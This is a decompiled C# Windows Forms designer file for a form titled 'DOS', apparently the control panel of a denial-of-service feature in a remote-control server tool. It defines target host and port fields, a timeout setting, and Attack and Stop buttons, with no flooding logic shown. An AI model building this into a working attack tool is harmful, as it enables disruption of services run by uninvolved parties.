namespace Server.Forms
{
	// Token: 0x02000087 RID: 135
	public partial class FormDOS : global::System.Windows.Forms.Form
	{
		// Token: 0x06000366 RID: 870 RVA: 0x00003EC6 File Offset: 0x000020C6
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		// Token: 0x06000367 RID: 871 RVA: 0x0002922C File Offset: 0x0002742C
		private void InitializeComponent()
		{
			this.components = new global::System.ComponentModel.Container();
			global::System.ComponentModel.ComponentResourceManager componentResourceManager = new global::System.ComponentModel.ComponentResourceManager(typeof(global::Server.Forms.FormDOS));
			this.groupBox1 = new global::System.Windows.Forms.GroupBox();
			this.label2 = new global::System.Windows.Forms.Label();
			this.label1 = new global::System.Windows.Forms.Label();
			this.txtPort = new global::System.Windows.Forms.TextBox();
			this.txtHost = new global::System.Windows.Forms.TextBox();
			this.groupBox2 = new global::System.Windows.Forms.GroupBox();
			this.label4 = new global::System.Windows.Forms.Label();
			this.label3 = new global::System.Windows.Forms.Label();
			this.txtTimeout = new global::System.Windows.Forms.TextBox();
			this.groupBox3 = new global::System.Windows.Forms.GroupBox();
			this.btnStop = new global::System.Windows.Forms.Button();
			this.btnAttack = new global::System.Windows.Forms.Button();
			this.timer1 = new global::System.Windows.Forms.Timer(this.components);
			this.timer2 = new global::System.Windows.Forms.Timer(this.components);
			this.groupBox1.SuspendLayout();
			this.groupBox2.SuspendLayout();
			this.groupBox3.SuspendLayout();
			base.SuspendLayout();
			this.groupBox1.Controls.Add(this.label2);
			this.groupBox1.Controls.Add(this.label1);
			this.groupBox1.Controls.Add(this.txtPort);
			this.groupBox1.Controls.Add(this.txtHost);
			this.groupBox1.Location = new global::System.Drawing.Point(12, 12);
			this.groupBox1.Name = "groupBox1";
			this.groupBox1.Size = new global::System.Drawing.Size(596, 114);
			this.groupBox1.TabIndex = 0;
			this.groupBox1.TabStop = false;
			this.groupBox1.Text = "Target";
			this.label2.AutoSize = true;
			this.label2.Location = new global::System.Drawing.Point(415, 47);
			this.label2.Name = "label2";
			this.label2.Size = new global::System.Drawing.Size(52, 20);
			this.label2.TabIndex = 2;
			this.label2.Text = "PORT";
			this.label1.AutoSize = true;
			this.label1.Location = new global::System.Drawing.Point(17, 47);
			this.label1.Name = "label1";
			this.label1.Size = new global::System.Drawing.Size(53, 20);
			this.label1.TabIndex = 2;
			this.label1.Text = "HOST";
			this.txtPort.Location = new global::System.Drawing.Point(477, 44);
			this.txtPort.Name = "txtPort";
			this.txtPort.Size = new global::System.Drawing.Size(70, 26);
			this.txtPort.TabIndex = 1;
			this.txtPort.Text = "80";
			this.txtHost.Location = new global::System.Drawing.Point(79, 44);
			this.txtHost.Name = "txtHost";
			this.txtHost.Size = new global::System.Drawing.Size(293, 26);
			this.txtHost.TabIndex = 1;
			this.txtHost.Text = "www.google.com";
			this.groupBox2.Controls.Add(this.label4);
			this.groupBox2.Controls.Add(this.label3);
			this.groupBox2.Controls.Add(this.txtTimeout);
			this.groupBox2.Location = new global::System.Drawing.Point(12, 146);
			this.groupBox2.Name = "groupBox2";
			this.groupBox2.Size = new global::System.Drawing.Size(596, 102);
			this.groupBox2.TabIndex = 1;
			this.groupBox2.TabStop = false;
			this.groupBox2.Text = "Settings";
			this.label4.AutoSize = true;
			this.label4.Location = new global::System.Drawing.Point(178, 45);
			this.label4.Name = "label4";
			this.label4.Size = new global::System.Drawing.Size(38, 20);
			this.label4.TabIndex = 5;
			this.label4.Text = "min.";
			this.label3.AutoSize = true;
			this.label3.Location = new global::System.Drawing.Point(18, 45);
			this.label3.Name = "label3";
			this.label3.Size = new global::System.Drawing.Size(80, 20);
			this.label3.TabIndex = 4;
			this.label3.Text = "TIMEOUT";
			this.txtTimeout.Location = new global::System.Drawing.Point(109, 42);
			this.txtTimeout.Name = "txtTimeout";
			this.txtTimeout.Size = new global::System.Drawing.Size(63, 26);
			this.txtTimeout.TabIndex = 3;
			this.txtTimeout.Text = "5";
			this.groupBox3.Controls.Add(this.btnStop);
			this.groupBox3.Controls.Add(this.btnAttack);
			this.groupBox3.Location = new global::System.Drawing.Point(12, 282);
			this.groupBox3.Name = "groupBox3";
			this.groupBox3.Size = new global::System.Drawing.Size(596, 100);
			this.groupBox3.TabIndex = 2;
			this.groupBox3.TabStop = false;
			this.groupBox3.Text = "Command";
			this.btnStop.Enabled = false;
			this.btnStop.Location = new global::System.Drawing.Point(477, 35);
			this.btnStop.Name = "btnStop";
			this.btnStop.Size = new global::System.Drawing.Size(107, 43);
			this.btnStop.TabIndex = 1;
			this.btnStop.Text = "Stop";
			this.btnStop.UseVisualStyleBackColor = true;
			this.btnStop.Click += new global::System.EventHandler(this.BtnStop_Click);
			this.btnAttack.Location = new global::System.Drawing.Point(22, 35);
			this.btnAttack.Name = "btnAttack";
			this.btnAttack.Size = new global::System.Drawing.Size(107, 43);
			this.btnAttack.TabIndex = 0;
			this.btnAttack.Text = "Attack";
			this.btnAttack.UseVisualStyleBackColor = true;
			this.btnAttack.Click += new global::System.EventHandler(this.BtnAttack_Click);
			this.timer1.Interval = 1000;
			this.timer1.Tick += new global::System.EventHandler(this.Timer1_Tick);
			this.timer2.Interval = 5000;
			this.timer2.Tick += new global::System.EventHandler(this.Timer2_Tick);
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(9f, 20f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			base.ClientSize = new global::System.Drawing.Size(631, 408);
			base.Controls.Add(this.groupBox3);
			base.Controls.Add(this.groupBox2);
			base.Controls.Add(this.groupBox1);
			//base.Icon = (global::System.Drawing.Icon)componentResourceManager.GetObject("$this.Icon");
			base.Name = "FormDOS";
			base.StartPosition = global::System.Windows.Forms.FormStartPosition.CenterParent;
			this.Text = "DOS";
			base.FormClosing += new global::System.Windows.Forms.FormClosingEventHandler(this.FormDOS_FormClosing);
			this.groupBox1.ResumeLayout(false);
			this.groupBox1.PerformLayout();
			this.groupBox2.ResumeLayout(false);
			this.groupBox2.PerformLayout();
			this.groupBox3.ResumeLayout(false);
			base.ResumeLayout(false);
		}

		// Token: 0x04000297 RID: 663
		private global::System.ComponentModel.IContainer components;

		// Token: 0x04000298 RID: 664
		private global::System.Windows.Forms.GroupBox groupBox1;

		// Token: 0x04000299 RID: 665
		private global::System.Windows.Forms.Label label2;

		// Token: 0x0400029A RID: 666
		private global::System.Windows.Forms.Label label1;

		// Token: 0x0400029B RID: 667
		private global::System.Windows.Forms.TextBox txtPort;

		// Token: 0x0400029C RID: 668
		private global::System.Windows.Forms.TextBox txtHost;

		// Token: 0x0400029D RID: 669
		private global::System.Windows.Forms.GroupBox groupBox2;

		// Token: 0x0400029E RID: 670
		private global::System.Windows.Forms.Label label4;

		// Token: 0x0400029F RID: 671
		private global::System.Windows.Forms.Label label3;

		// Token: 0x040002A0 RID: 672
		private global::System.Windows.Forms.TextBox txtTimeout;

		// Token: 0x040002A1 RID: 673
		private global::System.Windows.Forms.GroupBox groupBox3;

		// Token: 0x040002A2 RID: 674
		private global::System.Windows.Forms.Button btnStop;

		// Token: 0x040002A3 RID: 675
		private global::System.Windows.Forms.Button btnAttack;

		// Token: 0x040002A4 RID: 676
		private global::System.Windows.Forms.Timer timer1;

		// Token: 0x040002A5 RID: 677
		private global::System.Windows.Forms.Timer timer2;
	}
}
